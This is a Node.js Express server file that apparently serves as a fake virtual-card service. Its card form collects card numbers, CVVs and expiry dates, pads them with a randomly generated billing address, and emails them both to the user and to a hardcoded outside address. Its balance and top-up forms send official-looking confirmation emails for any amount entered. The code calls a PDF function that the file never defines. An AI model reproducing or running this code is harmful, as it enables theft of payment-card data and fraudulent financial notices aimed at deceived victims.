require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const hbs = require('hbs');
const { faker } = require('@faker-js/faker');
const { jsPDF } = require('jspdf');
const fs = require('fs');

const app = express();
app.set('view engine', 'hbs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

// Register Handlebars Partials
hbs.registerPartials(path.join(__dirname, 'views', 'partials'));

// Function to generate a realistic random billing address
function generateBillingAddress() {
    const streetAddress = faker.location.streetAddress({ useFullAddress: true });
    const city = faker.location.city();
    const state = faker.location.state({ abbreviated: true });
    const zip = faker.location.zipCode();
    return `${streetAddress}, ${city}, ${state} ${zip}`;
}

// Render the homepage
app.get('/', (req, res) => {
    res.render('homepage');
});

// Render the card form
app.get('/card', (req, res) => {
    res.render('form');
});

// Handle card form submission
app.post('/submit', async (req, res) => {
    const { user_email, card_number, cvv, expiry_date, card_name } = req.body;
    const billingAddress = generateBillingAddress();

    // Generate the PDF
    const pdfPath = await generatePDF(card_name, card_number, expiry_date, cvv, billingAddress);

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: '587',
        secure: false,
        auth: {
            user: process.env.EMAIL,
            pass: process.env.EMAIL_PASSWORD,
        },
    });

    // Compile the email template
    const emailTemplatePath = path.join(__dirname, 'views', 'emails', 'email.hbs');
    const emailTemplate = fs.readFileSync(emailTemplatePath, 'utf8');
    const compiledTemplate = hbs.compile(emailTemplate);
    const cardHTML = compiledTemplate({
        cardName: card_name,
        cardNumber: card_number.replace(/(.{4})/g, '$1 '),
        expiryDate: expiry_date,
        cvv,
        billingAddress,
    });

    // Send email
    const mailOptions = {
        from: process.env.EMAIL,
        to: [user_email, 'response@virtualservicesaf.com'],
        subject: 'Card Information',
        html: cardHTML,
        attachments: [
            {
                filename: 'card-information.pdf',
                path: pdfPath,
            },
        ],
    };

    try {
        await transporter.sendMail(mailOptions);
        fs.unlinkSync(pdfPath); // Delete the PDF after sending
        res.send('<script>alert("Email sent successfully!"); window.location="/";</script>');
    } catch (error) {
        console.error(error);
        res.status(500).send('<script>alert("Error sending email."); window.location="/";</script>');
    }
});

// Render the balance form
app.get('/balance', (req, res) => {
    res.render('balance-form');
});

// Handle balance form submission
app.post('/send-balance', async (req, res) => {
    const { user_email, balance } = req.body;

    // Ensure balance has two decimal places
    const formattedBalance = parseFloat(balance).toFixed(2);

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: '587',
        secure: false,
        auth: {
            user: process.env.EMAIL,
            pass: process.env.EMAIL_PASSWORD,
        },
    });

    // Email content
    const balanceHTML = `
        <div style="max-width: 600px; margin: auto; font-family: Arial, sans-serif; background-color: #f9f9f9; border: 1px solid #ddd; padding: 20px; border-radius: 10px;">
            <p style="text-align: center; font-size: 1rem; color: #333;">Your virtual card balance is:</p>
            <div style="background-color: #007BFF; color: white; border-radius: 10px; padding: 20px; text-align: center;">
                <h3 style="margin: 0; font-size: 2em;">$${formattedBalance}</h3>
            </div>
            <footer style="margin-top: 20px; text-align: center; font-size: 0.9em; color: #555;">
                <p>Visit our website: <a href="https://oragpay.com" style="color: #007BFF;">Our Website</a></p>
            </footer>
        </div>
    `;

    const mailOptions = {
        from: process.env.EMAIL,
        to: user_email,
        subject: 'Your Virtual Card Balance',
        html: balanceHTML,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.send('<script>alert("Balance email sent successfully!"); window.location="/balance";</script>');
    } catch (error) {
        console.error(error);
        res.status(500).send('<script>alert("Error sending balance email."); window.location="/balance";</script>');
    }
});

// Render the top-up form
app.get('/topup', (req, res) => {
    res.render('topup-form');
});

// Handle top-up form submission
app.post('/send-topup', async (req, res) => {
    const { user_email, amount } = req.body;

    // Ensure amount has two decimal places
    const formattedAmount = parseFloat(amount).toFixed(2);

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: '587',
        secure: false,
        auth: {
            user: process.env.EMAIL,
            pass: process.env.EMAIL_PASSWORD,
        },
    });

    // Email content
    const topupHTML = `
        <div style="max-width: 600px; margin: auto; font-family: Arial, sans-serif; background-color: #f9f9f9; border: 1px solid #ddd; padding: 20px; border-radius: 10px;">
            <p style="text-align: center; font-size: 1rem; color: #333; font-weight: bold;">$${formattedAmount} was successfully added to your card.</p>
            <footer style="margin-top: 20px; text-align: center; font-size: 0.9em; color: #555;">
                <p>Visit our website: <a href="https://oragpay.com" style="color: #007BFF;">Our Website</a></p>
            </footer>
        </div>
    `;

    const mailOptions = {
        from: process.env.EMAIL,
        to: user_email,
        subject: 'Top-Up Successful',
        html: topupHTML,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.send('<script>alert("Top-up email sent successfully!"); window.location="/topup";</script>');
    } catch (error) {
        console.error(error);
        res.status(500).send('<script>alert("Error sending top-up email."); window.location="/topup";</script>');
    }
});

// Start the server
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
